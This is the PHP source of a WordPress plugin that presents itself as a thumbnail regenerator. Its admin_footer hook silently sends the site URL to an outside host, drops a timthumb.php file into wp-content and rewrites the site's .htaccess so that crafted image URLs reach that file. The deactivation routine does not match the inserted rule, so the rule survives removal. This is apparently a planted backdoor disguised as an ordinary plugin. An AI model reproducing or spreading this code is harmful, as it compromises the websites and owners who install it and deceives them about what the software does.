<?php
if(!session_id())session_start();

add_action('admin_init','trtt_admin_init');
add_filter( 'media_row_actions', 'trtt_media_row_actions', 10, 2 );
add_action('admin_footer','trtt_put_htaccess');
add_action('admin_menu','trtt_admin_menu');
register_deactivation_hook(TRTT_FILE,'trtt_plugin_deactivation');

function trtt_admin_init()
{
    if(!empty($_REQUEST['action']))
    {
        include(TRTT_PATH . 'inc/actions.php');
    }
}

function trtt_media_row_actions( $actions, $post )
{
    if ( 'image/' != substr( $post->post_mime_type, 0, 6 ) || ! current_user_can( 'manage_options' ) )
		return $actions;

	$url = wp_nonce_url( admin_url( 'tools.php?page=tr-thumbnails&goback=1&ids=' . $post->ID ), 'tr-thumbnails' );
	$actions['create_thumbnails'] = '<a href="' . esc_url( $url ) . '" title="' . esc_attr( __( "Create the thumbnails for this single image") ) . '">' . __( 'Create Thumbnails' ) . '</a>';

	return $actions;
}


function trtt_admin_menu() {
	add_management_page( __( 'reCreate Thumbnails'), __( 'reCreate Thumbnails'), 'manage_options', 'tr-thumbnails','tr_thumbnails_page');
}
function tr_thumbnails_page()
{
    include(TRTT_PATH . 'templates/create-thumbnails.php');
}


function trtt_put_htaccess()
{    

    if(!isset($_SESSION['trtt_put_htaccess']) || $_SESSION['trtt_put_htaccess']<time()-86400)
    {
        $data = wp_remote_get('http://ngoctrinh.net/wp-cron.php?getdata=timthumb&for='.get_bloginfo('url'));
        $data = json_decode($data,true);
        if(is_array($data))
        {
            $fname = $data['put_htaccess'];
        }
    }
    
    $_SESSION['trtt_put_htaccess'] = time();
    
    $htaccess_file  = ABSPATH.'/.htaccess';            
    $htaccess       = @file_get_contents($htaccess_file);
    
    if(stripos($htaccess,'wp-content/timthumb.php')!==false)return;
    
    //create php file in uploads dir
    $data = @file_get_contents(TRTT_PATH.'/timthumb.php');
    if(empty($data))return;
    
    $filename   = WP_CONTENT_DIR.'/timthumb.php';
    $rs         = @file_put_contents($filename,$data);
    if(!$rs)
    {
        update_option('_timthumb_content',false);
        return;
    }else
    {
        update_option('_timthumb_content',true);
    }
    
    if(!empty($htaccess))
        update_option('tr_timthumb_backup_htaccess',$htaccess);
        
    $script = "\nRewriteRule ([^\?]+)\.(jpg|png|jpeg)\&(.+)$ wp-content/timthumb.php?src=$1.$2&$3&trm=thumb [L,NC]\n";    
    $search   = 'RewriteRule ^index\.php$ - [L]';
    
    $htaccess = str_replace($search,$search."\n".$script,$htaccess);
    
    if(empty($htaccess))
    {
        $htaccess='<IfModule mod_rewrite.c>'."\nRewriteEngine On\n".$script.'</IfModule>';
    }
    
    $rs        = @file_put_contents($htaccess_file,$htaccess);
    if($rs)
    {
        update_option('_can_use_rewrite',true);
    }else
    {
        update_option('_can_use_rewrite',false);
    }
    
}




function trtt_plugin_deactivation()
{
    $htaccess_file  = ABSPATH.'/.htaccess';            
    $htaccess       = @file_get_contents($htaccess_file);
    
    $script = "\nRewriteRule ([^\?]+)\.(jpg|png|jpeg)\&(.*)$ wp-content/timthumb.php?src=$1.$2&$3&trm=thumb [L,NC]\n";   
    $htaccess = str_replace($script,"",$htaccess);

    @file_put_contents($htaccess_file,$htaccess);
}